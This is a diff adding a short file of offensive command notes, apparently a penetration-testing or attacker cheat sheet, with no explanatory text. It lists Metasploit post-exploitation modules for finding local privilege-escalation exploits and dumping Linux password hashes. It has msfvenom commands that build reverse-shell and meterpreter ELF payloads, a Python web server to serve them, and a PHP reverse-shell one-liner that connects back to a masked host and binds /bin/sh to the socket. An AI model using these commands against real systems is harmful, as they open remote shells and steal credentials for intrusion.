@@ -1,0 +1,12 @@
+run post/multi/recon/local_exploit_suggester
+run post/linux/gather/hashdump
+sessions -u #
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=#### LPORT=#### -f elf > shell.elf
+msfvenom -p linux/x64/shell/reverse_tcp LHOST=#### LPORT=#### -f elf > shell.elf
+python -m http.server #### --dir .
+use payload/linux/x64/meterpreter_reverse_tcp
+search platform:linux type:payload meterpreter
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=#### LPORT=#### -f elf > shell-x64.elf
+
+$sock=fsockopen("#########", 1234);
+exec("/bin/sh -i <&3 >&3 2>&3");
